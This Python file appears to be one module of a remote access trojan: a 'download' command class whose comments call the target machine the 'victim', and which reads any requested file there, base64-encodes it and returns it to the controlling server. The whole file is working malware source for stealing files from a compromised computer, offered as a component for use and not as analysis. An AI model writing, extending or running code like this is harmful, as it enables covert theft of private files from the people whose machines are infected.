# Download command - retrieve file from client to server.

import base64
import logging
import os
from typing import Any, Dict

from client.commands.base import BaseCommand

logger = logging.getLogger(__name__)

# Chunk size for reading files (1 MB)
CHUNK_SIZE = 1024 * 1024


class DownloadCommand(BaseCommand):
    # Retrieve a file from the client (victim) to the server.

    @property
    def name(self) -> str:
        return "download"

    @property
    def description(self) -> str:
        return "Retrieve file from victim to server"

    def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
        # Execute the download command.
        remote_path = params.get("remote_path")
        if not remote_path:
            return self._error_response("Missing required parameter: remote_path")

        try:
            # Validate and normalize the path
            remote_path = os.path.normpath(remote_path)

            # Check if file exists
            if not os.path.exists(remote_path):
                return self._error_response(f"File not found: {remote_path}")

            # Check if it's a file (not a directory)
            if not os.path.isfile(remote_path):
                return self._error_response(f"Not a file: {remote_path}")

            # Get file info
            file_stat = os.stat(remote_path)
            file_size = file_stat.st_size

            logger.info(f"Downloading file: {remote_path} ({file_size} bytes)")

            # Read file in chunks for memory efficiency with large files
            content_chunks = []
            bytes_read = 0
            with open(remote_path, "rb") as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    content_chunks.append(chunk)
                    bytes_read += len(chunk)

            # Combine and encode
            content = b"".join(content_chunks)
            encoded_content = base64.b64encode(content).decode("utf-8")

            logger.info(f"File download complete: {remote_path} ({bytes_read} bytes)")

            return {
                "success": True,
                "remote_path": remote_path,
                "size": file_size,
                "content": encoded_content,
                "encoding": "base64",
                "message": f"Successfully downloaded {remote_path}",
            }

        except PermissionError as e:
            logger.error(f"Permission denied accessing {remote_path}: {e}")
            return self._error_response(f"Permission denied: {remote_path}")
        except OSError as e:
            logger.error(f"OS error accessing {remote_path}: {e}")
            return self._error_response(f"Error accessing file: {e}")

    def _error_response(self, message: str) -> Dict[str, Any]:
        # Create an error response.
        return {
            "success": False,
            "error": message,
        }
